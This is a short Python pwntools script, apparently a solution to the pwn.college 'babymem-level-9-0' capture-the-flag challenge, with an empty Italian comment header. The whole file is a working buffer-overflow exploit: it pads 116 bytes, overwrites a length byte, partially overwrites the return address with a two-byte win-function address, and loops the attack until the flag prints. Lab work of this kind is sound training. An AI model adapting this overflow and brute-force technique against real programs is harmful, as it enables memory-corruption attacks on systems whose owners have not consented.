#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --

-----------------------------
'''

# context.log_level = 'CRITICAL'

elf = ELF('/challenge/babymem-level-9-0')

win_addr = p16(0x1996) # p16(0x1481)
delta_len = 116 # 72
padding = b'A' * delta_len
bytestream = padding + p8(136 - 1) + win_addr

while True:

    p = elf.process()

    p.sendline(b'138')
    p.sendline(bytestream)
    output = p.recvall().decode()

    if 'pwn.college' in output:
        print(output)
        break
